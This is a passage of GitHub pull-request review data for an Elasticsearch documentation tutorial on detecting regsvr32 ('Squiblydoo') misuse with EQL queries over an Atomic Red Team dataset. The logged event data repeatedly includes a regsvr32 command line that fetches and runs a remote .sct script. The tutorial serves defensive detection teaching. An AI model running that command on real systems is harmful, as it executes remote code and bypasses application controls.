21,\n+  \"timed_out\": false,\n+  \"hits\": {\n+    \"total\": {\n+      \"value\": 1,\n+      \"relation\": \"eq\"\n+    },\n+    \"events\": [\n+      {\n+        \"_index\": \"my-index-000001\",\n+        \"_id\": \"gl5MJXMBMk1dGnErnBW8\",\n+        \"_score\": null,\n+        \"_source\": {\n+          \"process\": {\n+            \"parent\": {\n+              \"name\": \"cmd.exe\",\n+              \"entity_id\": \"{42FC7E13-CBCB-5C05-0000-0010AA385401}\",\n+              \"executable\": \"C:\\\\Windows\\\\System32\\\\cmd.exe\"\n+            },\n+            \"name\": \"regsvr32.exe\",\n+            \"pid\": 2012,\n+            \"entity_id\": \"{42FC7E13-CBCB-5C05-0000-0010A0395401}\",\n+            \"command_line\": \"regsvr32.exe  /s /u /i:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1117/RegSvr32.sct scrobj.dll\",\n+            \"executable\": \"C:\\\\Windows\\\\System32\\\\regsvr32.exe\",\n+            \"ppid\": 2652\n+          },\n+          \"logon_id\": 217055,\n+          \"@timestamp\": 131883573237130000,\n+          \"event\": {\n+            \"category\": \"process\",\n+            \"type\": \"creation\"\n+          },\n+          \"user\": {\n+            \"full_name\": \"bob\",\n+            \"domain\": \"ART-DESKTOP\",\n+            \"id\": \"ART-DESKTOP\\\\bob\"\n+          }\n+        }\n+      }\n+    ]\n+  }\n+}\n+----\n+// TESTRESPONSE[s/\"took\": 21/\"took\": $body.took/]\n+// TESTRESPONSE[s/\"_id\": \"gl5MJXMBMk1dGnErnBW8\"/\"_id\": $body.hits.events.0._id/]\n+\n+[discrete]\n+[[eql-ex-check-for-malicious-script-loads]]\n+=== Check for malicious script loads\n+\n+You now know that `regsvr32.exe` was used to register\n+a potentially malicious script as `scrob.dll`. Next, find any processes that\n+later load the `scrob.dll` file.\n+\n+Modify the previous EQL query as follows:\n+\n+* Change the `any` keyword to `file`. This means the query only matches\n+events with an `event.category` of `file`.\n+* Add the `file.name == \"scrobj.dll` condition to check for loads of\n+the `scrobj.dll` file.\n+\n+[source,console]\n+----\n+GET /my-index-000001/_eql/search\n+{\n+  \"query\": \"\"\"\n+    file where process.name == \"regsvr32.exe\" and file.name == \"scrobj.dll\"\n+  \"\"\",\n+  \"size\": 150\n+}\n+----\n+// TEST[setup:atomic_red_regsvr32]\n+\n+The query matches an event, confirming that `scrobj.dll` was later loaded by\n+`regsvr32.exe`.\n+\n+[source,console-result]\n+----\n+{\n+  \"is_partial\": false,\n+  \"is_running\": false,\n+  \"took\": 5,\n+  \"timed_out\": false,\n+  \"hits\": {\n+    \"total\": {\n+      \"value\": 1,\n+      \"relation\": \"eq\"\n+    },\n+    \"events\": [\n+      {\n+        \"_index\": \"my-index-000001\",\n+        \"_id\": \"ol5MJXMBMk1dGnErnBW8\",\n+        \"_score\": null,\n+        \"_source\": {\n+          \"process\": {\n+            \"name\": \"regsvr32.exe\",\n+            \"pid\": 2012,\n+            \"entity_id\": \"{42FC7E13-CBCB-5C05-0000-0010A0395401}\",\n+            \"executable\": \"C:\\\\Windows\\\\System32\\\\regsvr32.exe\"\n+          },\n+          \"file\": {\n+            \"path\": \"C:\\\\Windows\\\\System32\\\\scrobj.dll\",\n+            \"name\": \"scrobj.dll\"\n+          },\n+          \"@timestamp\": 131883573237450016,\n+          \"event\": {\n+            \"category\": \"file\"\n+          }\n+        }\n+      }\n+    ]\n+  }\n+}\n+----\n+// TESTRESPONSE[s/\"took\": 5/\"took\": $body.took/]\n+// TESTRESPONSE[s/\"_id\": \"ol5MJXMBMk1dGnErnBW8\"/\"_id\": $body.hits.events.0._id/]\n+\n+[discrete]\n+[[eql-ex-detemine-likelihood-of-sucess]]\n+=== Determine likelihood of success\n+\n+In many cases, malicious scripts are used to download other remote files. If\n+this occurred, the attack progressed and might have succeeded.\n+\n+Use an <<eql-sequences,EQL sequence query>> to check for the following series of\n+events, in order:\n+\n+. A `regsvr32.exe` process, which could have been used to register malicious\n+scripts as `scrobj.dll`\n+. A load of the `scrobj.dll` file\n+. Any network event, which could indicate the download of a remote file", "originalCommit": "f31c960703c14de408a11b972445c80b1309683d", "replyToReviewId": null, "replies": null, "type": "inlineReview"}, {"oid": "6311651939e3f23db2b0cba7b998ef5fbed6ee66", "url": "https://github.com/elastic/elasticsearch/commit/6311651939e3f23db2b0cba7b998ef5fbed6ee66", "message": "Address feedback", "committedDate": "2020-08-14T14:58:57Z", "type": "commit"}, {"oid": "7a309b2ec44500d1b220696cdf96628c2cbad323", "url": "https://github.com/elastic/elasticsearch/commit/7a309b2ec44500d1b220696cdf96628c2cbad323", "message": "typos", "committedDate": "2020-08-14T15:01:41Z", "type": "commit"}, {"id": "MDI0OlB1bGxSZXF1ZXN0UmV2aWV3Q29tbWVudDQ3MDY4MDAzOQ==", "url": "https://github.com/elastic/elasticsearch/pull/59105#discussion_r470680039", "bodyText": "probably safe to remove", "author": "rw-access", "createdAt": "2020-08-14T15:02:12Z", "path": "docs/reference/eql/detect-threats-with-eql.asciidoc", "diffHunk": "@@ -0,0 +1,434 @@\n+[role=\"xpack\"]\n+[testenv=\"basic\"]\n+[[eql-ex-threat-detection]]\n+== Example: Detect threats with EQL\n+\n+experimental::[]\n+\n+This example tutorial shows you how you can use EQL to detect security threats\n+and other suspicious behavior.\n+\n+In the scenario, you're tasked with detecting\n+https://attack.mitre.org/techniques/T1218/010/[`regsvr32` misuse] in Windows event\n+logs. `regsvr32` misuse is a known adversary technique documented in the\n+https://attack.mitre.org[MITRE ATT&CK\u00ae] knowledge base.\n+\n+[discrete]\n+[[eql-ex-threat-detection-setup]]\n+=== Setup\n+\n+This tutorial uses a test dataset for `regsvr32` misuse from\n+https://github.com/redcanaryco/atomic-red-team[Atomic Red Team]. The dataset has\n+been normalized and mapped to use some fields from the {ecs-ref}[Elastic Common\n+Schema (ECS)], including the `@timestamp` and `event.category` fields. The\n+dataset includes events that imitate behaviors related to `regsvr32` misuse, as\n+documented by MITRE ATT&CK\u00ae.\n+\n+To get started, download and index the dataset:\n+\n+. Download the https://raw.githubusercontent.com/elastic/elasticsearch/{branch}/docs/src/test/resources/normalized-T1117-AtomicRed-regsvr32.json[`normalized-T1117-AtomicRed-regsvr32.json`] dataset.\n+\n+. Index the data into the `my-index-000001` index with the following\n+<<docs-bulk,bulk API>> request:\n++\n+[source,sh]\n+----\n+curl -H \"Content-Type: application/json\" -XPOST \"localhost:9200/my-index-000001/_bulk?pretty&refresh\" --data-binary \"@normalized-T1117-AtomicRed-regsvr32.json\"\n+----\n+// NOTCONSOLE\n+\n+. Use the <<cat-indices,cat indices API>> to verify the dataset was indexed\n+successfully.\n++\n+[source,console]\n+----\n+GET /_cat/indices/my-index-000001?v&h=health,status,index,docs.count\n+----\n+// TEST[setup:atomic_red_regsvr32]\n++\n+The API returns the following response. The `docs.count` value should show `150`\n+documents were indexed.\n++\n+[source,txt]\n+----\n+health status index            docs.count\n+yellow open   my-index-000001         150\n+----\n+// TESTRESPONSE[non_json]\n+\n+[discrete]\n+[[eql-ex-get-a-count-of-regsvr32-events]]\n+=== Get a count of `regsvr32.exe` events\n+\n+Since you're looking for `regsvr32` misuse, start by looking at any events\n+associated with a `regsvr32.exe` process.\n+\n+The following <<eql-search-api,EQL search API>> request uses an EQL query to\n+retrieve a count of events with a `process.name` of `regsvr32.exe`. The query\n+starts with the <<eql-syntax-match-any-event-category,`any where` keywords>>,\n+meaning the query can match events of any <<eql-required-fields,event\n+category>>.\n+\n+[source,console]\n+----\n+GET /my-index-000001/_eql/search?filter_path=-hits.events   <1>\n+{\n+  \"query\": \"\"\"\n+    any where process.name == \"regsvr32.exe\"                <2>\n+  \"\"\",\n+  \"size\": 200                                               <3>\n+}\n+----\n+// TEST[setup:atomic_red_regsvr32]\n+\n+<1> Uses the `?filter_path=-hits.events` query parameter to exclude the\n+`hits.events` property from the response. The `hits.events` property contains\n+the document source for any matching events. This request is intended to\n+retrieve a count of events only.\n+<2> Uses an EQL query to match events with a `process.name` of `regsvr32.exe`.\n+<3> Returns up to 200 events or sequences matching the EQL query.\n+\n+The request returns the following response, indicating that 143 events match the\n+query.\n+\n+[source,console-result]\n+----\n+{\n+  \"is_partial\": false,\n+  \"is_running\": false,\n+  \"took\": 60,\n+  \"timed_out\": false,\n+  \"hits\": {\n+    \"total\": {\n+      \"value\": 143,\n+      \"relation\": \"eq\"\n+    }\n+  }\n+}\n+----\n+// TESTRESPONSE[s/\"took\": 60/\"took\": $body.took/]\n+\n+[discrete]\n+[[eql-ex-check-for-command-line-artifacts]]\n+=== Check for command line artifacts\n+\n+Based on your previous query, you know `regsvr32` processes were associated with\n+143 events. But how was first `regsvr32.exe` called? And who called it?\n+\n+`regsvr32` is a command-line utility so narrowing your results to processes where\n+the command line was used may help.\n+\n+First, in the previous EQL query, change the `any` keyword to `process`. This\n+means the query will only match processes, which have an `event.category` of\n+`process`.\n+\n+Next, append `and process.command_line != null` to the query. Now the query will\n+only match processes with a command line value.\n+\n+You'll also need to remove the `filter_path=-hits.events` query parameter. This\n+lets you retrieve the document source for any matching events.\n+\n+[source,console]\n+----\n+GET /my-index-000001/_eql/search\n+{\n+  \"query\": \"\"\"\n+    process where process.name == \"regsvr32.exe\" and process.command_line != null\n+  \"\"\",\n+  \"size\": 150", "originalCommit": "7a309b2ec44500d1b220696cdf96628c2cbad323", "replyToReviewId": null, "replies": null, "type": "inlineReview"}, {"oid": "dce4db4c6185f0dc97c979c35d3e9be2c7bc847a", "url": "https://github.com/elastic/elasticsearch/commit/dce4db4c6185f0dc97c979c35d3e9be2c7bc847a", "message": "clarify", "committedDate": "2020-08-14T15:02:37Z", "type": "commit"}, {"id": "MDI0OlB1bGxSZXF1ZXN0UmV2aWV3Q29tbWVudDQ3MDY4MDg0MA==", "url": "https://github.com/elastic/elasticsearch/pull/59105#discussion_r470680840", "bodyText": "I believe this is more technically correct\n\n  \n    \n      \n        Suggested change\n        \n          \n    \n\n        \n      \n    \n    \n      \n          \n            \n            `process.command_line` value, `regsvr32.exe` was used to register a script as\n          \n          \n            \n            `scrobj.dll`. This fits the behavior of a\n          \n          \n            \n            `process.command_line` value, `regsvr32.exe` used `scrobj.dll` to register a script.\n          \n          \n            \n            This fits the behavior of a", "author": "rw-access", "createdAt": "2020-08-14T15:03:30Z", "path": "docs/reference/eql/detect-threats-with-eql.asciidoc", "diffHunk": "@@ -0,0 +1,434 @@\n+[role=\"xpack\"]\n+[testenv=\"basic\"]\n+[[eql-ex-threat-detection]]\n+== Example: Detect threats with EQL\n+\n+experimental::[]\n+\n+This example tutorial shows you how you can use EQL to detect security threats\n+and other suspicious behavior.\n+\n+In the scenario, you're tasked with detecting\n+https://attack.mitre.org/techniques/T1218/010/[`regsvr32` misuse] in Windows event\n+logs. `regsvr32` misuse is a known adversary technique documented in the\n+https://attack.mitre.org[MITRE ATT&CK\u00ae] knowledge base.\n+\n+[discrete]\n+[[eql-ex-threat-detection-setup]]\n+=== Setup\n+\n+This tutorial uses a test dataset for `regsvr32` misuse from\n+https://github.com/redcanaryco/atomic-red-team[Atomic Red Team]. The dataset has\n+been normalized and mapped to use some fields from the {ecs-ref}[Elastic Common\n+Schema (ECS)], including the `@timestamp` and `event.category` fields. The\n+dataset includes events that imitate behaviors related to `regsvr32` misuse, as\n+documented by MITRE ATT&CK\u00ae.\n+\n+To get started, download and index the dataset:\n+\n+. Download the https://raw.githubusercontent.com/elastic/elasticsearch/{branch}/docs/src/test/resources/normalized-T1117-AtomicRed-regsvr32.json[`normalized-T1117-AtomicRed-regsvr32.json`] dataset.\n+\n+. Index the data into the `my-index-000001` index with the following\n+<<docs-bulk,bulk API>> request:\n++\n+[source,sh]\n+----\n+curl -H \"Content-Type: application/json\" -XPOST \"localhost:9200/my-index-000001/_bulk?pretty&refresh\" --data-binary \"@normalized-T1117-AtomicRed-regsvr32.json\"\n+----\n+// NOTCONSOLE\n+\n+. Use the <<cat-indices,cat indices API>> to verify the dataset was indexed\n+successfully.\n++\n+[source,console]\n+----\n+GET /_cat/indices/my-index-000001?v&h=health,status,index,docs.count\n+----\n+// TEST[setup:atomic_red_regsvr32]\n++\n+The API returns the following response. The `docs.count` value should show `150`\n+documents were indexed.\n++\n+[source,txt]\n+----\n+health status index            docs.count\n+yellow open   my-index-000001         150\n+----\n+// TESTRESPONSE[non_json]\n+\n+[discrete]\n+[[eql-ex-get-a-count-of-regsvr32-events]]\n+=== Get a count of `regsvr32.exe` events\n+\n+Since you're looking for `regsvr32` misuse, start by looking at any events\n+associated with a `regsvr32.exe` process.\n+\n+The following <<eql-search-api,EQL search API>> request uses an EQL query to\n+retrieve a count of events with a `process.name` of `regsvr32.exe`. The query\n+starts with the <<eql-syntax-match-any-event-category,`any where` keywords>>,\n+meaning the query can match events of any <<eql-required-fields,event\n+category>>.\n+\n+[source,console]\n+----\n+GET /my-index-000001/_eql/search?filter_path=-hits.events   <1>\n+{\n+  \"query\": \"\"\"\n+    any where process.name == \"regsvr32.exe\"                <2>\n+  \"\"\",\n+  \"size\": 200                                               <3>\n+}\n+----\n+// TEST[setup:atomic_red_regsvr32]\n+\n+<1> Uses the `?filter_path=-hits.events` query parameter to exclude the\n+`hits.events` property from the response. The `hits.events` property contains\n+the document source for any matching events. This request is intended to\n+retrieve a count of events only.\n+<2> Uses an EQL query to match events with a `process.name` of `regsvr32.exe`.\n+<3> Returns up to 200 events or sequences matching the EQL query.\n+\n+The request returns the following response, indicating that 143 events match the\n+query.\n+\n+[source,console-result]\n+----\n+{\n+  \"is_partial\": false,\n+  \"is_running\": false,\n+  \"took\": 60,\n+  \"timed_out\": false,\n+  \"hits\": {\n+    \"total\": {\n+      \"value\": 143,\n+      \"relation\": \"eq\"\n+    }\n+  }\n+}\n+----\n+// TESTRESPONSE[s/\"took\": 60/\"took\": $body.took/]\n+\n+[discrete]\n+[[eql-ex-check-for-command-line-artifacts]]\n+=== Check for command line artifacts\n+\n+Based on your previous query, you know `regsvr32` processes were associated with\n+143 events. But how was first `regsvr32.exe` called? And who called it?\n+\n+`regsvr32` is a command-line utility so narrowing your results to processes where\n+the command line was used may help.\n+\n+First, in the previous EQL query, change the `any` keyword to `process`. This\n+means the query will only match processes, which have an `event.category` of\n+`process`.\n+\n+Next, append `and process.command_line != null` to the query. Now the query will\n+only match processes with a command line value.\n+\n+You'll also need to remove the `filter_path=-hits.events` query parameter. This\n+lets you retrieve the document source for any matching events.\n+\n+[source,console]\n+----\n+GET /my-index-000001/_eql/search\n+{\n+  \"query\": \"\"\"\n+    process where process.name == \"regsvr32.exe\" and process.command_line != null\n+  \"\"\",\n+  \"size\": 150\n+}\n+----\n+// TEST[setup:atomic_red_regsvr32]\n+\n+The query matches one process. The event has an `event.type` of `creation`,\n+indicating the start of a `regsvr32.exe` process. Based on the\n+`process.command_line` value, `regsvr32.exe` was used to register a script as\n+`scrobj.dll`. This fits the behavior of a", "originalCommit": "7a309b2ec44500d1b220696cdf96628c2cbad323", "replyToReviewId": null, "replies": null, "type": "inlineReview"}, {"id": "MDI0OlB1bGxSZXF1ZXN0UmV2aWV3Q29tbWVudDQ3MDY4MTYwOQ==", "url": "https://github.com/elastic/elasticsearch/pull/59105#discussion_r470681609", "bodyText": "Suggested change\n        \n          \n    \n\n        \n      \n    \n    \n      \n          \n            \n            You now know that a `regsvr32.exe` process was used to register a potentially\n          \n          \n            \n            malicious script as `scrob.dll`. Next, see if `regsvr32.exe` later loads the\n          \n          \n            \n            You now know that a `regsvr32.exe` process was used to execute a potentially\n          \n          \n            \n            malicious script `RegSvr32.sct`. Next, see if `regsvr32.exe` later loads the", "author": "rw-access", "createdAt": "2020-08-14T15:04:49Z", "path": "docs/reference/eql/detect-threats-with-eql.asciidoc", "diffHunk": "@@ -0,0 +1,434 @@\n+[role=\"xpack\"]\n+[testenv=\"basic\"]\n+[[eql-ex-threat-detection]]\n+== Example: Detect threats with EQL\n+\n+experimental::[]\n+\n+This example tutorial shows you how you can use EQL to detect security threats\n+and other suspicious behavior.\n+\n+In the scenario, you're tasked with detecting\n+https://attack.mitre.org/techniques/T1218/010/[`regsvr32` misuse] in Windows event\n+logs. `regsvr32` misuse is a known adversary technique documented in the\n+https://attack.mitre.org[MITRE ATT&CK\u00ae] knowledge base.\n+\n+[discrete]\n+[[eql-ex-threat-detection-setup]]\n+=== Setup\n+\n+This tutorial uses a test dataset for `regsvr32` misuse from\n+https://github.com/redcanaryco/atomic-red-team[Atomic Red Team]. The dataset has\n+been normalized and mapped to use some fields from the {ecs-ref}[Elastic Common\n+Schema (ECS)], including the `@timestamp` and `event.category` fields. The\n+dataset includes events that imitate behaviors related to `regsvr32` misuse, as\n+documented by MITRE ATT&CK\u00ae.\n+\n+To get started, download and index the dataset:\n+\n+. Download the https://raw.githubusercontent.com/elastic/elasticsearch/{branch}/docs/src/test/resources/normalized-T1117-AtomicRed-regsvr32.json[`normalized-T1117-AtomicRed-regsvr32.json`] dataset.\n+\n+. Index the data into the `my-index-000001` index with the following\n+<<docs-bulk,bulk API>> request:\n++\n+[source,sh]\n+----\n+curl -H \"Content-Type: application/json\" -XPOST \"localhost:9200/my-index-000001/_bulk?pretty&refresh\" --data-binary \"@normalized-T1117-AtomicRed-regsvr32.json\"\n+----\n+// NOTCONSOLE\n+\n+. Use the <<cat-indices,cat indices API>> to verify the dataset was indexed\n+successfully.\n++\n+[source,console]\n+----\n+GET /_cat/indices/my-index-000001?v&h=health,status,index,docs.count\n+----\n+// TEST[setup:atomic_red_regsvr32]\n++\n+The API returns the following response. The `docs.count` value should show `150`\n+documents were indexed.\n++\n+[source,txt]\n+----\n+health status index            docs.count\n+yellow open   my-index-000001         150\n+----\n+// TESTRESPONSE[non_json]\n+\n+[discrete]\n+[[eql-ex-get-a-count-of-regsvr32-events]]\n+=== Get a count of `regsvr32.exe` events\n+\n+Since you're looking for `regsvr32` misuse, start by looking at any events\n+associated with a `regsvr32.exe` process.\n+\n+The following <<eql-search-api,EQL search API>> request uses an EQL query to\n+retrieve a count of events with a `process.name` of `regsvr32.exe`. The query\n+starts with the <<eql-syntax-match-any-event-category,`any where` keywords>>,\n+meaning the query can match events of any <<eql-required-fields,event\n+category>>.\n+\n+[source,console]\n+----\n+GET /my-index-000001/_eql/search?filter_path=-hits.events   <1>\n+{\n+  \"query\": \"\"\"\n+    any where process.name == \"regsvr32.exe\"                <2>\n+  \"\"\",\n+  \"size\": 200                                               <3>\n+}\n+----\n+// TEST[setup:atomic_red_regsvr32]\n+\n+<1> Uses the `?filter_path=-hits.events` query parameter to exclude the\n+`hits.events` property from the response. The `hits.events` property contains\n+the document source for any matching events. This request is intended to\n+retrieve a count of events only.\n+<2> Uses an EQL query to match events with a `process.name` of `regsvr32.exe`.\n+<3> Returns up to 200 events or sequences matching the EQL query.\n+\n+The request returns the following response, indicating that 143 events match the\n+query.\n+\n+[source,console-result]\n+----\n+{\n+  \"is_partial\": false,\n+  \"is_running\": false,\n+  \"took\": 60,\n+  \"timed_out\": false,\n+  \"hits\": {\n+    \"total\": {\n+      \"value\": 143,\n+      \"relation\": \"eq\"\n+    }\n+  }\n+}\n+----\n+// TESTRESPONSE[s/\"took\": 60/\"took\": $body.took/]\n+\n+[discrete]\n+[[eql-ex-check-for-command-line-artifacts]]\n+=== Check for command line artifacts\n+\n+Based on your previous query, you know `regsvr32` processes were associated with\n+143 events. But how was first `regsvr32.exe` called? And who called it?\n+\n+`regsvr32` is a command-line utility so narrowing your results to processes where\n+the command line was used may help.\n+\n+First, in the previous EQL query, change the `any` keyword to `process`. This\n+means the query will only match processes, which have an `event.category` of\n+`process`.\n+\n+Next, append `and process.command_line != null` to the query. Now the query will\n+only match processes with a command line value.\n+\n+You'll also need to remove the `filter_path=-hits.events` query parameter. This\n+lets you retrieve the document source for any matching events.\n+\n+[source,console]\n+----\n+GET /my-index-000001/_eql/search\n+{\n+  \"query\": \"\"\"\n+    process where process.name == \"regsvr32.exe\" and process.command_line != null\n+  \"\"\",\n+  \"size\": 150\n+}\n+----\n+// TEST[setup:atomic_red_regsvr32]\n+\n+The query matches one process. The event has an `event.type` of `creation`,\n+indicating the start of a `regsvr32.exe` process. Based on the\n+`process.command_line` value, `regsvr32.exe` was used to register a script as\n+`scrobj.dll`. This fits the behavior of a\n+https://attack.mitre.org/techniques/T1218/010/[\"Squiblydoo\" attack], a known\n+variant of `regsvr32` misuse.\n+\n+The query also retrieved other valuable information about how the `regsvr32.exe`\n+process started, such as the `@timestamp`, the associated `user.id`, and the\n+`process.parent.name`.\n+\n+[source,console-result]\n+----\n+{\n+  \"is_partial\": false,\n+  \"is_running\": false,\n+  \"took\": 21,\n+  \"timed_out\": false,\n+  \"hits\": {\n+    \"total\": {\n+      \"value\": 1,\n+      \"relation\": \"eq\"\n+    },\n+    \"events\": [\n+      {\n+        \"_index\": \"my-index-000001\",\n+        \"_id\": \"gl5MJXMBMk1dGnErnBW8\",\n+        \"_score\": null,\n+        \"_source\": {\n+          \"process\": {\n+            \"parent\": {\n+              \"name\": \"cmd.exe\",\n+              \"entity_id\": \"{42FC7E13-CBCB-5C05-0000-0010AA385401}\",\n+              \"executable\": \"C:\\\\Windows\\\\System32\\\\cmd.exe\"\n+            },\n+            \"name\": \"regsvr32.exe\",\n+            \"pid\": 2012,\n+            \"entity_id\": \"{42FC7E13-CBCB-5C05-0000-0010A0395401}\",\n+            \"command_line\": \"regsvr32.exe  /s /u /i:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1117/RegSvr32.sct scrobj.dll\",\n+            \"executable\": \"C:\\\\Windows\\\\System32\\\\regsvr32.exe\",\n+            \"ppid\": 2652\n+          },\n+          \"logon_id\": 217055,\n+          \"@timestamp\": 131883573237130000,\n+          \"event\": {\n+            \"category\": \"process\",\n+            \"type\": \"creation\"\n+          },\n+          \"user\": {\n+            \"full_name\": \"bob\",\n+            \"domain\": \"ART-DESKTOP\",\n+            \"id\": \"ART-DESKTOP\\\\bob\"\n+          }\n+        }\n+      }\n+    ]\n+  }\n+}\n+----\n+// TESTRESPONSE[s/\"took\": 21/\"took\": $body.took/]\n+// TESTRESPONSE[s/\"_id\": \"gl5MJXMBMk1dGnErnBW8\"/\"_id\": $body.hits.events.0._id/]\n+\n+[discrete]\n+[[eql-ex-check-for-malicious-script-loads]]\n+=== Check for malicious script loads\n+\n+You now know that a `regsvr32.exe` process was used to register a potentially\n+malicious script as `scrob.dll`. Next, see if `regsvr32.exe` later loads the", "originalCommit": "7a309b2ec44500d1b220696cdf96628c2cbad323", "replyToReviewId": null, "replies": null, "type": "inlineReview"}, {"oid": "9fd41d18aea4aa5bcff39b5ca07d4f74a25ca774", "url": "https://github.com/elastic/elasticsearch/commit/9fd41d18aea4aa5bcff39b5ca07d4f74a25ca774", "message": "typo", "committedDate": "2020-08-14T15:05:13Z", "type": "commit"}, {"oid": "0197764277b8608d6a3a68300a4e9ee1915c558f", "url": "https://github.com/elastic/elasticsearch/commit/0197764277b8608d6a3a68300a4e9ee1915c558f", "message": "update sequence query section", "committedDate": "2020-08-14T15:16:41Z", "type": "commit"}, {"oid": "e5725ef17e5ff032b080355229a4b074d407345f", "url": "https://github.com/elastic/elasticsearch/commit/e5725ef17e5ff032b080355229a4b074d407345f", "message": "reword", "committedDate": "2020-08-14T15:18:04Z", "type": "commit"}]}